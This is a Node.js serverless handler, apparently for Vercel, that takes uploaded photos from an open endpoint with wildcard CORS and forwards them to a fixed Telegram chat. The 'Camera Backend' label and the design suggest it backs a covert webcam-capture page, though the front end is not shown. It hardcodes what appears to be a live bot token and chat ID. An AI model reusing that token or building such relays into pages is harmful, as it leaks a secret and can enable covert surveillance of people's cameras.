const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');

// Vars (Hardcoded fallback)
const BOT_TOKEN = process.env.BOT_TOKEN || '8217603317:AAHbCjswpTeM2YMP-PdnBMZ8xvmfdr2jIug';
const CHAT_ID = process.env.CHAT_ID || '1603071848';

// Configure Multer
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Helper to run middleware
function runMiddleware(req, res, fn) {
    return new Promise((resolve, reject) => {
        fn(req, res, (result) => {
            if (result instanceof Error) {
                return reject(result);
            }
            return resolve(result);
        });
    });
}

// Main Handler
module.exports = async function handler(req, res) {
    // Enable CORS manually
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );

    // Handle OPTIONS (Preflight)
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(200).send('Camera Backend is Running! (V3 - Native)');
    }

    try {
        // Run Multer
        await runMiddleware(req, res, upload.single('photo'));

        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }

        console.log('Sending photo to Telegram...');

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', req.file.buffer, {
            filename: 'photo.jpg',
            contentType: req.file.mimetype,
        });

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            form,
            {
                headers: { ...form.getHeaders() },
            }
        );

        res.status(200).json({ success: true, telegram: telegramResponse.data.ok });

    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({
            error: error.response ? error.response.data.description : error.message
        });
    }
};

// Disable Vercel body parser (CRITICAL)
module.exports.config = {
    api: {
        bodyParser: false,
    },
};
